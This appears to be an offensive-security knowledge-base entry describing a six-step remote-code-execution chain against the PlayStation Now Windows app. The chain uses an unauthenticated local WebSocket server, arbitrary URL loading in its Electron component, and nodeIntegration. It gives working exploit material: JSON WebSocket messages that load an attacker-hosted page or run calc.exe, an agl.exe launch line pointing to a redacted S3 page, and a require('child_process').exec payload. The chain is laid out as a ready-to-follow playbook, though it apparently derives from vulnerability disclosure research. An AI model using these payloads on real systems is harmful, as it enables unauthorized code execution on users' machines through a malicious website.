---
tags:
  - rce
  - websocket
  - electron
  - origin-bypass
  - nodeintegration
type: attack_chain
tools:
  - '[[tools/Process-Monitor]]'
  - '[[tools/Burp-Suite]]'
  - '[[tools/Request-Highlighter]]'
tactics:
  - '[[procedures/Exploit-NodeIntegration-for-Code-Execution]]'
  - '[[Discovery]]'
  - '[[Initial Access]]'
commands:
  - '[[commands/websocket-seturldefaultbrowser-calc]]'
  - '[[commands/require-child-process-exec-calc]]'
platforms:
  - Windows
complexity: medium
procedures:
  - '[[procedures/Launch-PlayStation-Now-Application]]'
  - '[[procedures/Proxy-Application-Traffic-for-Inspection]]'
  - '[[procedures/Test-WebSocket-Server-for-Origin-Validation]]'
  - '[[procedures/Test-Arbitrary-URL-Loading-via-WebSocket]]'
  - '[[procedures/Exploit-NodeIntegration-for-Code-Execution]]'
  - '[[procedures/Chain-Vulnerabilities-for-Full-RCE]]'
step_count: 6
techniques:
  - '[[Command-Line Interface]]'
  - '[[Exploit Public-Facing Application]]'
  - '[[Inter-Process Communication]]'
description: >-
  Chaining improper access control in a local WebSocket server, arbitrary URL
  loading, and insecure Electron configuration to achieve RCE on Windows
  machines running PlayStation Now.
skill_level: intermediate
impact_level: high
id: f2cac36c-1db7-46b2-a30b-728d6741eece
created_at: '2025-12-11T03:47:56.490Z'
updated_at: '2025-12-11T03:47:56.490Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[TA0002]]'
  - '[[TA0007]]'
  - '[[TA0001]]'
mitre_techniques:
  - '[[T1059]]'
  - '[[T1190]]'
  - '[[T1559]]'
---
# Remote Code Execution in PlayStation Now via WebSocket Origin Bypass and Electron NodeIntegration

Multi-stage attack chain demonstrating remote code execution by exploiting a local WebSocket server without origin validation, arbitrary URL loading in an Electron component, and insecure nodeIntegration enabling Node.js API access.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 6 |
| Execution Time | ~15 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Launch Application] --> B[Proxy Traffic]
    B --> C[Test Origin Validation]
    C --> D[Test URL Loading]
    D --> E[Exploit NodeIntegration]
    E --> F[Chain for RCE]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#3498db
    style D fill:#27ae60
    style E fill:#e74c3c
    style F fill:#f39c12
```

## Prerequisites & Requirements

### Required Tools

- [[tools/Process-Monitor]]
- #netstat
- [[tools/Burp-Suite]]
- [[tools/Request-Highlighter]]

### Target Environment

- Windows OS
- PlayStation Now application version 11.0.2 installed
- Local ports: 1235 (WebSocket server)
- Services: WebSocket server, QAS (psnowlauncher.exe), AGL (agl.exe)
- Tech stack: Qt5, Electron

### Initial Access Requirements

- Local access to the machine running PlayStation Now
- Ability to visit arbitrary websites on the same machine
- No credentials required beyond application installation

## Detailed Attack Procedures

### Step 1: Launch Application - [[procedures/Launch-PlayStation-Now-Application]]

**Procedure**: [[procedures/Launch-PlayStation-Now-Application]]

**Objective**: Start the PlayStation Now application to initialize the local WebSocket server and AGL component for further analysis and exploitation.

**Expected Output**: Application launches, spawns AGL.exe, and starts WebSocket server at localhost:1235.

**Success Indicators**:
- WebSocket server listening on port 1235
- AGL.exe process running

Use [[commands/netstat-anb]] to verify the server:

```bash
netstat -anb
```

Look for psnowlauncher.exe bound to port 1235.

### Step 2: Proxy Traffic - [[procedures/Proxy-Application-Traffic-for-Inspection]]

**Procedure**: [[procedures/Proxy-Application-Traffic-for-Inspection]]

**Objective**: Intercept and inspect communications between application components using a proxy to understand WebSocket interactions.

**Expected Output**: Traffic proxied through Burp Suite, allowing inspection of requests with specific User-Agent headers.

**Success Indicators**:
- Proxy configured and CA certificate installed
- Requests highlighted based on User-Agents like 'gkApollo', 'QtWebEngine/5.5.1', 'Electron/1.4.16'

Open proxy settings with [[commands/control-exe-inetcpl-cpl-4]]:

```bash
control.exe inetcpl.cpl,,4
```

Set proxy to 127.0.0.1:8080 and install Burp CA.

### Step 3: Test Origin Validation - [[procedures/Test-WebSocket-Server-for-Origin-Validation]]

**Procedure**: [[procedures/Test-WebSocket-Server-for-Origin-Validation]]

**Objective**: Verify that the local WebSocket server does not enforce origin checks, allowing arbitrary connections.

**Expected Output**: Successful connection and message processing from a browser-loaded webpage without origin validation.

**Success Indicators**:
- WebSocket connection established from arbitrary origin
- Server responds to sent messages

Connect to ws://localhost:1235 from a webpage and send test messages via Burp Suite.

### Step 4: Test URL Loading - [[procedures/Test-Arbitrary-URL-Loading-via-WebSocket]]

**Procedure**: [[procedures/Test-Arbitrary-URL-Loading-via-WebSocket]]

**Objective**: Confirm ability to load arbitrary URLs in the AGL component using WebSocket commands.

**Expected Output**: AGL loads the specified URL or executes local files.

**Success Indicators**:
- Remote URL loaded in AGL
- Local file (e.g., calc.exe) executed

Send [[commands/websocket-seturl-example]]:

```json
{"command":"setUrl","params":{"url":"https://example.net"},"source":"QAS","target":"AGL"}
```

Or [[commands/websocket-seturldefaultbrowser-calc]]:

```json
{"command":"setUrlDefaultBrowser","params":{"url":"file:///c:/windows/system32/calc.exe"},"source":"QAS","target":"AGL"}
```

### Step 5: Exploit NodeIntegration - [[procedures/Exploit-NodeIntegration-for-Code-Execution]]

**Procedure**: [[procedures/Exploit-NodeIntegration-for-Code-Execution]]

**Objective**: Use insecure nodeIntegration to execute arbitrary code from a loaded malicious URL.

**Expected Output**: Malicious JavaScript executes, spawning processes like calc.exe.

**Success Indicators**:
- calc.exe launches via Node.js API
- Arbitrary code execution confirmed

Launch AGL with [[commands/agl-exe-url-malicious]]:

```bash
"C:\Program Files (x86)\PlayStationNow\agl\agl.exe" --url=https://[redacted].s3.us-east-1.amazonaws.com/node.html
```

The page runs [[commands/require-child-process-exec-calc]]:

```javascript
require('child_process').exec('calc')
```

### Step 6: Chain for RCE - [[procedures/Chain-Vulnerabilities-for-Full-RCE]]

**Procedure**: [[procedures/Chain-Vulnerabilities-for-Full-RCE]]

**Objective**: Combine all vulnerabilities to achieve RCE from a malicious website visited on the same machine.

**Expected Output**: Website connects to WebSocket, loads malicious URL in AGL, and executes code.

**Success Indicators**:
- Full chain executes without user interaction beyond visiting the site
- System compromise via RCE

Send [[commands/websocket-seturl-malicious]] from the webpage:

```json
{"command":"setUrl","params":{"url":"https://[redacted].s3.us-east-1.amazonaws.com/node.html"},"source":"QAS","target":"AGL"}
```

## Attack Chain Summary

### Key Achievements

1. Identified and exploited lack of origin validation in WebSocket server
2. Achieved arbitrary URL loading in Electron app
3. Executed code via nodeIntegration, leading to full RCE

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Command-Line Interface]]
- [[Exploit Public-Facing Application]]
- [[Inter-Process Communication]]

### MITRE ATT&CK Tactics

- [[procedures/Exploit-NodeIntegration-for-Code-Execution]]
- [[Discovery]]
- [[Initial Access]]

*Last updated: 2023-10-01*
